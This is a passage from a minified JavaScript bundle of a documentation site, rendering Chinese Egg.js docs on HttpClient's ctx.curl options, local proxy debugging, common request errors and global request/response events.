\u6570\u636e\u4f1a\u5305\u542b\u8fd9\u4e9b\u7279\u6b8a\u63a7\u5236\u5b57\u7b26\uff0c\u901a\u8fc7\u6b64\u53c2\u6570\u53ef\u4ee5\u81ea\u52a8\u8fc7\u6ee4\u6389\u5b83\u4eec\u3002"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  fixJSONCtlChars: true,\n  dataType: 'json',\n});",lang:"js"}),r.a.createElement("h3",{id:"headers-object"},r.a.createElement(l["AnchorLink"],{to:"#headers-object","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"headers: Object")),r.a.createElement("p",null,"\u81ea\u5b9a\u4e49\u8bf7\u6c42\u5934\u3002"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  headers: {\n    'x-foo': 'bar',\n  },\n});",lang:"js"}),r.a.createElement("h3",{id:"timeout-numberarray"},r.a.createElement(l["AnchorLink"],{to:"#timeout-numberarray","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"timeout: Number|Array")),r.a.createElement("p",null,"\u8bf7\u6c42\u8d85\u65f6\u65f6\u95f4\uff0c\u9ed8\u8ba4\u662f ",r.a.createElement("code",null,"[ 5000, 5000 ]"),"\uff0c\u5373\u521b\u5efa\u8fde\u63a5\u8d85\u65f6\u662f 5 \u79d2\uff0c\u63a5\u6536\u54cd\u5e94\u8d85\u65f6\u662f 5 \u79d2\u3002"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  // \u521b\u5efa\u8fde\u63a5\u8d85\u65f6 3 \u79d2\uff0c\u63a5\u6536\u54cd\u5e94\u8d85\u65f6 3 \u79d2\n  timeout: 3000,\n});\n\nctx.curl(url, {\n  // \u521b\u5efa\u8fde\u63a5\u8d85\u65f6 1 \u79d2\uff0c\u63a5\u6536\u54cd\u5e94\u8d85\u65f6 30 \u79d2\uff0c\u7528\u4e8e\u54cd\u5e94\u6bd4\u8f83\u5927\u7684\u573a\u666f\n  timeout: [1000, 30000],\n});",lang:"js"}),r.a.createElement("h3",{id:"agent-httpagent"},r.a.createElement(l["AnchorLink"],{to:"#agent-httpagent","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"agent: HttpAgent")),r.a.createElement("p",null,"\u5141\u8bb8\u901a\u8fc7\u6b64\u53c2\u6570\u8986\u76d6\u9ed8\u8ba4\u7684 HttpAgent\uff0c\u5982\u679c\u4f60\u4e0d\u60f3\u5f00\u542f KeepAlive\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u6b64\u53c2\u6570\u4e3a ",r.a.createElement("code",null,"false"),"\u3002"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  agent: false,\n});",lang:"js"}),r.a.createElement("h3",{id:"httpsagent-httpsagent"},r.a.createElement(l["AnchorLink"],{to:"#httpsagent-httpsagent","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"httpsAgent: HttpsAgent")),r.a.createElement("p",null,"\u5141\u8bb8\u901a\u8fc7\u6b64\u53c2\u6570\u8986\u76d6\u9ed8\u8ba4\u7684 HttpsAgent\uff0c\u5982\u679c\u4f60\u4e0d\u60f3\u5f00\u542f KeepAlive\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u6b64\u53c2\u6570\u4e3a ",r.a.createElement("code",null,"false"),"\u3002"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  httpsAgent: false,\n});",lang:"js"}),r.a.createElement("h3",{id:"auth-string"},r.a.createElement(l["AnchorLink"],{to:"#auth-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"auth: String")),r.a.createElement("p",null,"\u7b80\u5355\u767b\u5f55\u6388\u6743\uff08Basic Authentication\uff09\u53c2\u6570\uff0c\u5c06\u4ee5\u660e\u6587\u65b9\u5f0f\u5c06\u767b\u5f55\u4fe1\u606f\u4ee5 ",r.a.createElement("code",null,"Authorization")," \u8bf7\u6c42\u5934\u53d1\u9001\u51fa\u53bb\u3002"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  // \u53c2\u6570\u5fc5\u987b\u6309\u7167 `user:password` \u683c\u5f0f\u8bbe\u7f6e\n  auth: 'foo:bar',\n});",lang:"js"}),r.a.createElement("h3",{id:"digestauth-string"},r.a.createElement(l["AnchorLink"],{to:"#digestauth-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"digestAuth: String")),r.a.createElement("p",null,"\u6458\u8981\u767b\u5f55\u6388\u6743\uff08Digest Authentication\uff09\u53c2\u6570\uff0c\u8bbe\u7f6e\u6b64\u53c2\u6570\u4f1a\u81ea\u52a8\u5bf9 401 \u54cd\u5e94\u5c1d\u8bd5\u751f\u6210 ",r.a.createElement("code",null,"Authorization")," \u8bf7\u6c42\u5934\uff0c \u5c1d\u8bd5\u4ee5\u6388\u6743\u65b9\u5f0f\u8bf7\u6c42\u4e00\u6b21\u3002"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  // \u53c2\u6570\u5fc5\u987b\u6309\u7167 `user:password` \u683c\u5f0f\u8bbe\u7f6e\n  digestAuth: 'foo:bar',\n});",lang:"js"}),r.a.createElement("h3",{id:"followredirect-boolean"},r.a.createElement(l["AnchorLink"],{to:"#followredirect-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"followRedirect: Boolean")),r.a.createElement("p",null,"\u662f\u5426\u81ea\u52a8\u8ddf\u8fdb 3xx \u7684\u8df3\u8f6c\u54cd\u5e94\uff0c\u9ed8\u8ba4\u662f ",r.a.createElement("code",null,"false"),"\u3002"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  followRedirect: true,\n});",lang:"js"}),r.a.createElement("h3",{id:"maxredirects-number"},r.a.createElement(l["AnchorLink"],{to:"#maxredirects-number","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"maxRedirects: Number")),r.a.createElement("p",null,"\u8bbe\u7f6e\u6700\u5927\u81ea\u52a8\u8df3\u8f6c\u6b21\u6570\uff0c\u907f\u514d\u5faa\u73af\u8df3\u8f6c\u65e0\u6cd5\u7ec8\u6b62\uff0c\u9ed8\u8ba4\u662f 10 \u6b21\u3002 \u6b64\u53c2\u6570\u4e0d\u5b9c\u8bbe\u7f6e\u8fc7\u5927\uff0c\u5b83\u53ea\u5728 ",r.a.createElement("code",null,"followRedirect=true")," \u60c5\u51b5\u4e0b\u624d\u4f1a\u751f\u6548\u3002"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  followRedirect: true,\n  // \u6700\u5927\u53ea\u5141\u8bb8\u81ea\u52a8\u8df3\u8f6c 5 \u6b21\u3002\n  maxRedirects: 5,\n});",lang:"js"}),r.a.createElement("h3",{id:"formatredirecturl-functionfrom-to"},r.a.createElement(l["AnchorLink"],{to:"#formatredirecturl-functionfrom-to","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"formatRedirectUrl: Function(from, to)")),r.a.createElement("p",null,"\u5141\u8bb8\u6211\u4eec\u901a\u8fc7 ",r.a.createElement("code",null,"formatRedirectUrl")," \u81ea\u5b9a\u4e49\u5b9e\u73b0 302\u3001301 \u7b49\u8df3\u8f6c url \u62fc\u63a5\uff0c \u9ed8\u8ba4\u662f ",r.a.createElement("code",null,"url.resolve(from, to)"),"\u3002"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  formatRedirectUrl: (from, to) => {\n    // \u4f8b\u5982\u53ef\u5728\u8fd9\u91cc\u4fee\u6b63\u8df3\u8f6c\u4e0d\u6b63\u786e\u7684 url\n    if (to === '//foo/') {\n      to = '/foo';\n    }\n    return url.resolve(from, to);\n  },\n});",lang:"js"}),r.a.createElement("h3",{id:"beforerequest-functionoptions"},r.a.createElement(l["AnchorLink"],{to:"#beforerequest-functionoptions","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"beforeRequest: Function(options)")),r.a.createElement("p",null,"HttpClient \u5728\u8bf7\u6c42\u6b63\u5f0f\u53d1\u9001\u4e4b\u524d\uff0c\u4f1a\u5c1d\u8bd5\u8c03\u7528 ",r.a.createElement("code",null,"beforeRequest")," \u94a9\u5b50\uff0c\u5141\u8bb8\u6211\u4eec\u5728\u8fd9\u91cc\u5bf9\u8bf7\u6c42\u53c2\u6570\u505a\u6700\u540e\u4e00\u6b21\u4fee\u6539\u3002"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  beforeRequest: (options) => {\n    // \u4f8b\u5982\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e\u5168\u5c40\u8bf7\u6c42 id\uff0c\u65b9\u4fbf\u65e5\u5fd7\u8ddf\u8e2a\n    options.headers['x-request-id'] = uuid.v1();\n  },\n});",lang:"js"}),r.a.createElement("h3",{id:"streaming-boolean"},r.a.createElement(l["AnchorLink"],{to:"#streaming-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"streaming: Boolean")),r.a.createElement("p",null,"\u662f\u5426\u76f4\u63a5\u8fd4\u56de\u54cd\u5e94\u6d41\uff0c\u9ed8\u8ba4\u4e3a ",r.a.createElement("code",null,"false"),"\u3002 \u5f00\u542f streaming \u4e4b\u540e\uff0cHttpClient \u4f1a\u5728\u62ff\u5230\u54cd\u5e94\u5bf9\u8c61 res \u4e4b\u540e\u9a6c\u4e0a\u8fd4\u56de\uff0c \u6b64\u65f6 ",r.a.createElement("code",null,"result.headers")," \u548c ",r.a.createElement("code",null,"result.status")," \u5df2\u7ecf\u53ef\u4ee5\u8bfb\u53d6\u5230\uff0c\u53ea\u662f\u6ca1\u6709\u8bfb\u53d6 data \u6570\u636e\u800c\u5df2\u3002"),r.a.createElement(o["a"],{code:"const result = await ctx.curl(url, {\n  streaming: true,\n});\n\nconsole.log(result.status, result.data);\n// result.res \u662f\u4e00\u4e2a ReadStream \u5bf9\u8c61\nctx.body = result.res;",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u5982\u679c res \u4e0d\u662f\u76f4\u63a5\u4f20\u9012\u7ed9 body\uff0c\u90a3\u4e48\u6211\u4eec\u5fc5\u987b\u6d88\u8d39\u8fd9\u4e2a stream\uff0c\u5e76\u4e14\u8981\u505a\u597d error \u4e8b\u4ef6\u5904\u7406\u3002")),r.a.createElement("h3",{id:"gzip-boolean"},r.a.createElement(l["AnchorLink"],{to:"#gzip-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"gzip: Boolean")),r.a.createElement("p",null,"\u662f\u5426\u652f\u6301 gzip \u54cd\u5e94\u683c\u5f0f\uff0c\u9ed8\u8ba4\u4e3a ",r.a.createElement("code",null,"false"),"\u3002 \u5f00\u542f gzip \u4e4b\u540e\uff0cHttpClient \u5c06\u81ea\u52a8\u8bbe\u7f6e ",r.a.createElement("code",null,"Accept-Encoding: gzip")," \u8bf7\u6c42\u5934\uff0c \u5e76\u4e14\u4f1a\u81ea\u52a8\u89e3\u538b\u5e26 ",r.a.createElement("code",null,"Content-Encoding: gzip")," \u54cd\u5e94\u5934\u7684\u6570\u636e\u3002"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  gzip: true,\n});",lang:"js"}),r.a.createElement("h3",{id:"timing-boolean"},r.a.createElement(l["AnchorLink"],{to:"#timing-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"timing: Boolean")),r.a.createElement("p",null,"\u662f\u5426\u5f00\u542f\u8bf7\u6c42\u5404\u9636\u6bb5\u7684\u65f6\u95f4\u6d4b\u91cf\uff0c\u9ed8\u8ba4\u4e3a ",r.a.createElement("code",null,"false"),"\u3002 \u5f00\u542f timing \u4e4b\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"result.res.timing")," \u62ff\u5230\u8fd9\u6b21 HTTP \u8bf7\u6c42\u5404\u9636\u6bb5\u7684\u65f6\u95f4\u6d4b\u91cf\u503c\uff08\u5355\u4f4d\u662f\u6beb\u79d2\uff09\uff0c \u901a\u8fc7\u8fd9\u4e9b\u6d4b\u91cf\u503c\uff0c\u6211\u4eec\u53ef\u4ee5\u975e\u5e38\u65b9\u4fbf\u5730\u5b9a\u4f4d\u5230\u8fd9\u6b21\u8bf7\u6c42\u6700\u6162\u7684\u73af\u5883\u53d1\u751f\u5728\u90a3\u4e2a\u9636\u6bb5\uff0c\u6548\u679c\u5982\u540c Chrome network timing \u7684\u4f5c\u7528\u3002"),r.a.createElement("p",null,"timing \u5404\u9636\u6bb5\u6d4b\u91cf\u503c\u89e3\u6790\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"queuing\uff1a\u5206\u914d socket \u8017\u65f6"),r.a.createElement("li",null,"dnslookup\uff1aDNS \u67e5\u8be2\u8017\u65f6"),r.a.createElement("li",null,"connected\uff1asocket \u4e09\u6b21\u63e1\u624b\u8fde\u63a5\u6210\u529f\u8017\u65f6"),r.a.createElement("li",null,"requestSent\uff1a\u8bf7\u6c42\u6570\u636e\u5b8c\u6574\u53d1\u9001\u5b8c\u6bd5\u8017\u65f6"),r.a.createElement("li",null,"waiting\uff1a\u6536\u5230\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u54cd\u5e94\u6570\u636e\u8017\u65f6"),r.a.createElement("li",null,"contentDownload\uff1a\u5168\u90e8\u54cd\u5e94\u6570\u636e\u63a5\u6536\u5b8c\u6bd5\u8017\u65f6")),r.a.createElement(o["a"],{code:'const result = await ctx.curl(url, {\n  timing: true,\n});\nconsole.log(result.res.timing);\n// {\n//   "queuing":29,\n//   "dnslookup":37,\n//   "connected":370,\n//   "requestSent":1001,\n//   "waiting":1833,\n//   "contentDownload":3416\n// }',lang:"js"}),r.a.createElement("h3",{id:"carejectunauthorizedpfxkeycertpassphrasecipherssecureprotocol"},r.a.createElement(l["AnchorLink"],{to:"#carejectunauthorizedpfxkeycertpassphrasecipherssecureprotocol","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"ca\uff0crejectUnauthorized\uff0cpfx\uff0ckey\uff0ccert\uff0cpassphrase\uff0cciphers\uff0csecureProtocol")),r.a.createElement("p",null,"\u8fd9\u51e0\u4e2a\u90fd\u662f\u900f\u4f20\u7ed9 ",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/https.html"},"HTTPS")," \u6a21\u5757\u7684\u53c2\u6570\uff0c\u5177\u4f53\u8bf7\u67e5\u770b ",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/https.html#https_https_request_options_callback"},r.a.createElement("code",null,"https.request(options, callback)")),"\u3002"),r.a.createElement("h2",{id:"\u8c03\u8bd5\u8f85\u52a9"},r.a.createElement(l["AnchorLink"],{to:"#\u8c03\u8bd5\u8f85\u52a9","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8c03\u8bd5\u8f85\u52a9"),r.a.createElement("p",null,"\u5982\u679c\u4f60\u9700\u8981\u5bf9 HttpClient \u7684\u8bf7\u6c42\u8fdb\u884c\u6293\u5305\u8c03\u8bd5\uff0c\u53ef\u4ee5\u6dfb\u52a0\u4ee5\u4e0b\u914d\u7f6e\u5230 ",r.a.createElement("code",null,"config.local.js"),"\uff1a"),r.a.createElement(o["a"],{code:"// config.local.js\nmodule.exports = () => {\n  const config = {};\n\n  // add http_proxy to httpclient\n  if (process.env.http_proxy) {\n    config.httpclient = {\n      request: {\n        enableProxy: true,\n        rejectUnauthorized: false,\n        proxy: process.env.http_proxy,\n      },\n    };\n  }\n\n  return config;\n};",lang:"js"}),r.a.createElement("p",null,"\u7136\u540e\u542f\u52a8\u4f60\u7684\u6293\u5305\u5de5\u5177\uff0c\u5982 ",r.a.createElement(l["Link"],{to:"https://www.charlesproxy.com/"},"charles")," \u6216 ",r.a.createElement(l["Link"],{to:"http://www.telerik.com/fiddler"},"fiddler"),"\u3002"),r.a.createElement("p",null,"\u6700\u540e\u901a\u8fc7\u4ee5\u4e0b\u6307\u4ee4\u542f\u52a8\u5e94\u7528\uff1a"),r.a.createElement(o["a"],{code:"$ http_proxy=http://127.0.0.1:8888 npm run dev",lang:"bash"}),r.a.createElement("p",null,"\u7136\u540e\u5c31\u53ef\u4ee5\u6b63\u5e38\u64cd\u4f5c\u4e86\uff0c\u6240\u6709\u7ecf\u8fc7 HttpClient \u7684\u8bf7\u6c42\uff0c\u90fd\u53ef\u4ee5\u4f60\u7684\u6293\u5305\u5de5\u5177\u4e2d\u67e5\u770b\u5230\u3002"),r.a.createElement("h2",{id:"\u5e38\u89c1\u9519\u8bef"},r.a.createElement(l["AnchorLink"],{to:"#\u5e38\u89c1\u9519\u8bef","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5e38\u89c1\u9519\u8bef"),r.a.createElement("h3",{id:"\u521b\u5efa\u8fde\u63a5\u8d85\u65f6"},r.a.createElement(l["AnchorLink"],{to:"#\u521b\u5efa\u8fde\u63a5\u8d85\u65f6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u521b\u5efa\u8fde\u63a5\u8d85\u65f6"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5f02\u5e38\u540d\u79f0\uff1a",r.a.createElement("code",null,"ConnectionTimeoutError")),r.a.createElement("li",null,"\u51fa\u73b0\u573a\u666f\uff1a\u901a\u5e38\u662f DNS \u67e5\u8be2\u6bd4\u8f83\u6162\uff0c\u6216\u8005\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u4e4b\u95f4\u7684\u7f51\u7edc\u901f\u5ea6\u6bd4\u8f83\u6162\u5bfc\u81f4\u7684\u3002"),r.a.createElement("li",null,"\u6392\u67e5\u5efa\u8bae\uff1a\u8bf7\u9002\u5f53\u589e\u5927 ",r.a.createElement("code",null,"timeout")," \u53c2\u6570\u3002")),r.a.createElement("h3",{id:"\u670d\u52a1\u54cd\u5e94\u8d85\u65f6"},r.a.createElement(l["AnchorLink"],{to:"#\u670d\u52a1\u54cd\u5e94\u8d85\u65f6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u670d\u52a1\u54cd\u5e94\u8d85\u65f6"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5f02\u5e38\u540d\u79f0\uff1a",r.a.createElement("code",null,"ResponseTimeoutError")),r.a.createElement("li",null,"\u51fa\u73b0\u573a\u666f\uff1a\u901a\u5e38\u662f\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u4e4b\u95f4\u7f51\u7edc\u901f\u5ea6\u6bd4\u8f83\u6162\uff0c\u5e76\u4e14\u54cd\u5e94\u6570\u636e\u6bd4\u8f83\u5927\u7684\u60c5\u51b5\u4e0b\u4f1a\u53d1\u751f\u3002"),r.a.createElement("li",null,"\u6392\u67e5\u5efa\u8bae\uff1a\u8bf7\u9002\u5f53\u589e\u5927 ",r.a.createElement("code",null,"timeout")," \u53c2\u6570\u3002")),r.a.createElement("h3",{id:"\u670d\u52a1\u4e3b\u52a8\u65ad\u5f00\u8fde\u63a5"},r.a.createElement(l["AnchorLink"],{to:"#\u670d\u52a1\u4e3b\u52a8\u65ad\u5f00\u8fde\u63a5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u670d\u52a1\u4e3b\u52a8\u65ad\u5f00\u8fde\u63a5"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5f02\u5e38\u540d\u79f0\uff1a",r.a.createElement("code",null,"ResponseError, code: ECONNRESET")),r.a.createElement("li",null,"\u51fa\u73b0\u573a\u666f\uff1a\u901a\u5e38\u662f\u670d\u52a1\u7aef\u4e3b\u52a8\u65ad\u5f00 socket \u8fde\u63a5\uff0c\u5bfc\u81f4 HTTP \u8bf7\u6c42\u94fe\u8def\u5f02\u5e38\u3002"),r.a.createElement("li",null,"\u6392\u67e5\u5efa\u8bae\uff1a\u8bf7\u68c0\u67e5\u5f53\u65f6\u670d\u52a1\u7aef\u662f\u5426\u53d1\u751f\u7f51\u7edc\u5f02\u5e38\u3002")),r.a.createElement("h3",{id:"\u670d\u52a1\u4e0d\u53ef\u8fbe"},r.a.createElement(l["AnchorLink"],{to:"#\u670d\u52a1\u4e0d\u53ef\u8fbe","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u670d\u52a1\u4e0d\u53ef\u8fbe"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5f02\u5e38\u540d\u79f0\uff1a",r.a.createElement("code",null,"RequestError, code: ECONNREFUSED, status: -1")),r.a.createElement("li",null,"\u51fa\u73b0\u573a\u666f\uff1a\u901a\u5e38\u662f\u56e0\u4e3a\u8bf7\u6c42\u7684 url \u6240\u5c5e IP \u6216\u8005\u7aef\u53e3\u65e0\u6cd5\u8fde\u63a5\u6210\u529f\u3002"),r.a.createElement("li",null,"\u6392\u67e5\u5efa\u8bae\uff1a\u8bf7\u786e\u4fdd IP \u6216\u8005\u7aef\u53e3\u8bbe\u7f6e\u6b63\u786e\u3002")),r.a.createElement("h3",{id:"\u57df\u540d\u4e0d\u5b58\u5728"},r.a.createElement(l["AnchorLink"],{to:"#\u57df\u540d\u4e0d\u5b58\u5728","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u57df\u540d\u4e0d\u5b58\u5728"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5f02\u5e38\u540d\u79f0\uff1a",r.a.createElement("code",null,"RequestError, code: ENOTFOUND, status: -1")),r.a.createElement("li",null,"\u51fa\u73b0\u573a\u666f\uff1a\u901a\u5e38\u662f\u56e0\u4e3a\u8bf7\u6c42\u7684 url \u6240\u5728\u7684\u57df\u540d\u65e0\u6cd5\u901a\u8fc7 DNS \u89e3\u6790\u6210\u529f\u3002"),r.a.createElement("li",null,"\u6392\u67e5\u5efa\u8bae\uff1a\u8bf7\u786e\u4fdd\u57df\u540d\u5b58\u5728\uff0c\u4e5f\u9700\u8981\u6392\u67e5\u4e00\u4e0b DNS \u670d\u52a1\u662f\u5426\u914d\u7f6e\u6b63\u786e\u3002")),r.a.createElement("h3",{id:"json-\u54cd\u5e94\u6570\u636e\u683c\u5f0f\u9519\u8bef"},r.a.createElement(l["AnchorLink"],{to:"#json-\u54cd\u5e94\u6570\u636e\u683c\u5f0f\u9519\u8bef","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"JSON \u54cd\u5e94\u6570\u636e\u683c\u5f0f\u9519\u8bef"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5f02\u5e38\u540d\u79f0\uff1a",r.a.createElement("code",null,"JSONResponseFormatError")),r.a.createElement("li",null,"\u51fa\u73b0\u573a\u666f\uff1a\u8bbe\u7f6e\u4e86 ",r.a.createElement("code",null,"dataType=json")," \u5e76\u4e14\u54cd\u5e94\u6570\u636e\u4e0d\u7b26\u5408 JSON \u683c\u5f0f\uff0c\u5c31\u4f1a\u629b\u51fa\u6b64\u5f02\u5e38\u3002"),r.a.createElement("li",null,"\u6392\u67e5\u5efa\u8bae\uff1a\u786e\u4fdd\u670d\u52a1\u7aef\u65e0\u8bba\u5728\u4ec0\u4e48\u60c5\u51b5\u4e0b\u90fd\u8981\u6b63\u786e\u8fd4\u56de JSON \u683c\u5f0f\u7684\u6570\u636e\u3002")),r.a.createElement("h2",{id:"\u5168\u5c40-request-\u548c-response-\u4e8b\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u5168\u5c40-request-\u548c-response-\u4e8b\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5168\u5c40 ",r.a.createElement("code",null,"request")," \u548c ",r.a.createElement("code",null,"response")," \u4e8b\u4ef6"),r.a.createElement("p",null,"\u5728\u4f01\u4e1a\u5e94\u7528\u573a\u666f\uff0c\u5e38\u5e38\u4f1a\u6709\u7edf\u4e00 tracer \u65e5\u5fd7\u7684\u9700\u6c42\u3002 \u4e3a\u4e86\u65b9\u4fbf\u5728 app \u5c42\u9762\u7edf\u4e00\u76d1\u542c HttpClient \u7684\u8bf7\u6c42\u548c\u54cd\u5e94\uff0c\u6211\u4eec\u7ea6\u5b9a\u4e86\u5168\u5c40 ",r.a.createElement("code",null,"request")," \u548c ",r.a.createElement("code",null,"response")," \u6765\u66b4\u9732\u8fd9\u4e24\u4e2a\u4e8b\u4ef6\u3002"),r.a.createElement(o["a"],{code:"init options\n        |\n        V\n    emit `request` event\n        |\n        V\n    send request and receive response\n        |\n        V\n    emit `response` event\n        |\n        V\n       end",lang:"bash"}),r.a.createElement("h3",{id:"request-\u4e8b\u4ef6\u53d1\u751f\u5728\u7f51\u7edc\u64cd\u4f5c\u53d1\u751f\u4e4b\u524d"},r.a.createElement(l["AnchorLink"],{to:"#request-\u4e8b\u4ef6\u53d1\u751f\u5728\u7f51\u7edc\u64cd\u4f5c\u53d1\u751f\u4e4b\u524d","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"request")," \u4e8b\u4ef6\uff1a\u53d1\u751f\u5728\u7f51\u7edc\u64cd\u4f5c\u53d1\u751f\u4e4b\u524d"),r.a.createElement("p",null,"\u8bf7\u6c42\u53d1\u9001\u4e4b\u524d\uff0c\u4f1a\u89e6\u53d1\u4e00\u4e2a ",r.a.createElement("code",null,"request")," \u4e8b\u4ef6\uff0c\u5141\u8bb8\u5bf9\u8bf7\u6c42\u505a\u62e6\u622a\u3002"),r.a.createElement(o["a"],{code:"app.httpclient.on('request', (req) => {\n  req.url; //\u8bf7\u6c42 url\n  req.ctx; //\u662f\u53d1\u8d77\u8fd9\u6b21\u8bf7\u6c42\u7684\u5f53\u524d\u4e0a\u4e0b\u6587\n\n  // \u53ef\u4ee5\u5728\u8fd9\u91cc\u8bbe\u7f6e\u4e00\u4e9b trace headers\uff0c\u65b9\u4fbf\u5168\u94fe\u8def\u8ddf\u8e2a\n});",lang:"js"}),r.a.createElement("h3",{id:"response-\u4e8b\u4ef6\u53d1\u751f\u5728\u7f51\u7edc\u64cd\u4f5c\u7ed3\u675f\u4e4b\u540e"},r.a.createElement(l["AnchorLink"],{to:"#response-\u4e8b\u4ef6\u53d1\u751f\u5728\u7f51\u7edc\u64cd\u4f5c\u7ed3\u675f\u4e4b\u540e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"response")," \u4e8b\u4ef6\uff1a\u53d1\u751f\u5728\u7f51\u7edc\u64cd\u4f5c\u7ed3\u675f\u4e4b\u540e"),r.a.createElement("p",null,"\u8bf7\u6c42\u7ed3\u675f\u4e4b\u540e\u4f1a\u89e6\u53d1\u4e00\u4e2a ",r.a.createElement("code",null,"response")," \u4e8b\u4ef6\uff0c\u8fd9\u6837\u5916\u90e8\u5c31\u53ef\u4ee5\u8ba2\u9605\u8fd9\u4e2a\u4e8b\u4ef6\u6253\u5370\u65e5\u5fd7\u3002"),r.a.createElement(o["a"],{code:"app.httpclient.on('response', (result) => {\n  result.res.status;\n  result.ctx; //\u662f\u53d1\u8d77\u8fd9\u6b21\u8bf7\u6c42\u7684\u5f53\u524d\u4e0a\u4e0b\u6587\n  result.req; //\u5bf9\u5e94\u7684 req \u5bf9\u8c61\uff0c\u5373 request \u4e8b\u4ef6\u91cc\u9762\u90a3\u4e2a req\n});",lang:"js"}),r.a.createElement("h2",{id:"\u793a\u4f8b\u4ee3\u7801"},r.a.createElement(l["AnchorLink"],{to:"#\u793a\u4f8b\u4ee3\u7801","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u793a\u4f8b\u4ee3\u7801"),r.a.createElement("p",null,"\u5b8c\u6574\u793a\u4f8b\u4ee3\u7801\u53ef\u4ee5\u5728 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/blob/master/httpclient"},"eggjs/examples/httpclient")," \u627e\u5230\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},ohqK:function(e,t,n){"use strict";function a(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}n.d(t,"a",(function(){return a}))},"oi/H":function(e,t,n){var a=n("u3TI").f,r=n("31yA"),l=n("q7Pv"),o=l("toStringTag");e.exports=function(e,t,n){e&&!r(e=n?e:e.prototype,o)&&a(e,o,{configurable:!0,value:t})}},oi8Y:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u867d\u7136\u6211\u4eec\u901a\u8fc7\u6846\u67b6\u5f00\u53d1\u7684 HTTP Server 